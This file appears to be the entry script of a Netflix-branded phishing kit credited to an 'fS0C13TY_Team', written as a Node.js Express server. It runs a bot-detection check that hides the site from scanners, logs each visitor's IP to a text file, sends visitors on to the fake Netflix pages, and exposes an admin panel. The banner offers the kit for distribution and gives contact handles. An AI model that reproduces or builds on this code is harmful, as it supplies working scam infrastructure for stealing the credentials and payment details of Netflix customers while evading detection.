/**
 * DO NOT SELL THIS SCRIPT !
 * DO NOT CHANGE COPYRIGHT !
 * Netflix fSOCIETY -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 *
 ###############################################
 #$            C0d3d by fS0C13TY_Team         $#
 #$   Recording doesn't  make you a Coder     $#
 #$          Copyright 2020 NETFLIX           $#
 ###############################################

 **/
import express from 'express';
import path from 'path';
import fs from 'fs';
import session from 'express-session';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const app = express();
const PORT = process.env.PORT || 3000;
// Session middleware
app.use(session({
    secret: 'fsociety-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false } // Set to true in production with HTTPS
}));
// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));
// Use route modules
app.use('/n', nRoutes);
app.use('/admin.php', adminRoutes);
app.use('/admin', adminRoutes);
import { comprehensiveBotCheck } from './bots/index.js';
// Import route modules
import nRoutes from './n/index.js';
import adminRoutes from './admin.js';
// Log IP function
function logIP(ip) {
    const logFile = path.join(__dirname, 'Vu.txt');
    const timestamp = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const logEntry = `${ip}  -  ${timestamp}\n`;
    fs.appendFile(logFile, logEntry, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
        }
    });
}
// Main route - equivalent to index.php
app.get('/', async (req, res) => {
    // Include system modules (equivalent to PHP includes)
    const isAllowed = await comprehensiveBotCheck(req, res);
    if (!isAllowed) {
        // Bot check failed, response already handled
        return;
    }
    // Log the IP address
    const ip = req.ip || req.connection.remoteAddress || 'unknown';
    logIP(ip);
    // Redirect to N directory (equivalent to $src="N"; header("location:$src");)
    res.redirect('/n');
});
// Start the server
app.listen(PORT, () => {
    console.log(`Netflix fSOCIETY server running on port ${PORT}`);
    console.log('Coded by fS0C13TY_Team');
});
export default app;
//# sourceMappingURL=index.js.map